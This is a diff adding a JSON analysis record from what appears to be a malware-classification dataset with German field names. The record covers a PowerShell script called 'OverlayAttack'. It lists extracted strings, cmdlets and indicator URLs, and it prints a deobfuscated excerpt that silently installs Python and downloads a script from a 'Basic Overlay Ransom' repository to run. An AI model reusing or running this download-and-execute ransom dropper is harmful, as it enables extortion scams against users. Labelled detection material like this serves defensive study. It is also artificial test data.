@@ -1,0 +1,127 @@
+{
+  "meta": {
+    "quelldatei": "tech_045_OverlayAttack.ps1",
+    "sha256": "a59febab729f89331e18b1744c6c869e5288af3f344e2a04591b50661ac9ce5c",
+    "groesse_bytes": 2498,
+    "zeilen": 68,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe",
+      "$env:TEMP\\python_installer.exe",
+      "/quiet",
+      "PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/datsmean.png",
+      "datsmean.png",
+      "Error downloading the file: $_.Exception.Message",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/FlipperVersion.py",
+      "$env:TEMP\\FlipperVersion.py",
+      "Downloading the Python script...",
+      "Running the downloaded Python script...",
+      "An error occurred: $_.Exception.Message"
+    ],
+    "string_anzahl_gesamt": 12,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe",
+      "$env:TEMP\\python_installer.exe",
+      "/quiet",
+      "PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/datsmean.png",
+      "datsmean.png",
+      "Error downloading the file: $_.Exception.Message",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/FlipperVersion.py",
+      "$env:TEMP\\FlipperVersion.py",
+      "Downloading the Python script...",
+      "Running the downloaded Python script...",
+      "An error occurred: $_.Exception.Message"
+    ],
+    "string_anzahl_gesamt": 12,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Download-File",
+      "Invoke-WebRequest",
+      "New-Object",
+      "Remove-Item",
+      "Start-Overlay",
+      "Start-Process",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "downloadfile": 2,
+      "invoke_webrequest": 2,
+      "start_process": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/FlipperVersion.py",
+        "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/datsmean.png",
+        "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP\\FlipperVersion.py",
+        "$env:TEMP\\python_installer.exe"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe",
+      "$env:TEMP\\python_installer.exe",
+      "/quiet",
+      "PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/datsmean.png",
+      "datsmean.png",
+      "Error downloading the file: $_.Exception.Message",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/FlipperVersion.py",
+      "$env:TEMP\\FlipperVersion.py",
+      "Downloading the Python script...",
+      "Running the downloaded Python script...",
+      "An error occurred: $_.Exception.Message"
+    ],
+    "string_anzahl_gesamt": 12,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Download-File",
+      "Invoke-WebRequest",
+      "New-Object",
+      "Remove-Item",
+      "Start-Overlay",
+      "Start-Process",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "downloadfile": 2,
+      "invoke_webrequest": 2,
+      "start_process": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/FlipperVersion.py",
+        "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/datsmean.png",
+        "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP\\FlipperVersion.py",
+        "$env:TEMP\\python_installer.exe"
+      ]
+    },
+    "deobfuskiert_auszug": "# This script is for educational purposes. Only a fool would actually try to harm someone using this script. All scripts involved in this process purposely lack\n# clean up code for the final steps. You will get caught. Ransomware is a crime and scamming is evil. Dont be evil.\nfunction Start-Overlay {\n    # Function to download a file using WebClient\n    function Download-File {\n        param (\n            [string]$url,\n            [string]$outputPath\n        )\n\n        $webClient = New-Object System.Net.WebClient\n        $webClient.DownloadFile($url, $outputPath)\n    }\n\n    # Download Python installer\n    $pythonInstallerUrl = \"https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe\"\n    $pythonInstallerPath = \"$env:TEMP\\python_installer.exe\"\n    Download-File -url $pythonInstallerUrl -outputPath $pythonInstallerPath\n\n    # Install Python\n    Start-Process -Wait -FilePath $pythonInstallerPath -ArgumentList \"/quiet\", \"PrependPath=1\"\n\n    # Install pip\n    python -m ensurepip\n\n    # Install Pillow\n    pip3 install Pillow\n\n    # Cleanup\n    Remove-Item -Path $pythonInstallerPath\n\n    # Define the URL of the PNG file and the destination path\n    $sourceUrl = \"https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/datsmean.png\"\n    $destinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), \"datsmean.png\")\n\n    # Create a WebClient object to download the file\n    $webClient = New-Object System.Net.WebClient\n\n    try {\n        # Download the file\n        $webClient.DownloadFile($sourceUrl, $destinationPath)\n    } catch {\n        Write-Host \"Error downloading the file: $_.Exception.Message\"\n    } finally {\n        # Dispose of the WebClient object\n        $webClient.Dispose()\n    }\n\n    # Set the URL of the Python script to download\n    $pythonScriptUrl = \"https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/FlipperVersion.py\"\n\n    # Set the destination path to save the downloaded Python scrip",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Datei von URL herunterladen",
+      "Prozess starten",
+      "Web-Anfrage senden"
+    ]
+  }
+}
